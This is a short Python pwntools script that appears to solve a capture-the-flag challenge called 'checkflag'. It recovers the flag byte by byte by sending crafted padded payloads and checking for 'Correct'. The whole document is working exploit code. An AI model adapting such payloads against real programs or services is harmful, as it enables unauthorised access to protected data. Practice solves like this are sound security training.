from pwn import *

flag = b''

for i in range(16):
    for j in range(0x20, 0x7f):
        p = process("./checkflag")
        #p = remote("host3.dreamhack.games", 13753)
        payload = b'A'*(15-i)+bytes([j])+flag+b'\x00'+b'B'*47+b'A'*(15-i)
        p.sendafter("What's the flag? ", payload)
        if b'Correct' in p.recvline():
            flag = bytes([j])+flag
            print(flag)
            p.close()
            break
        p.close()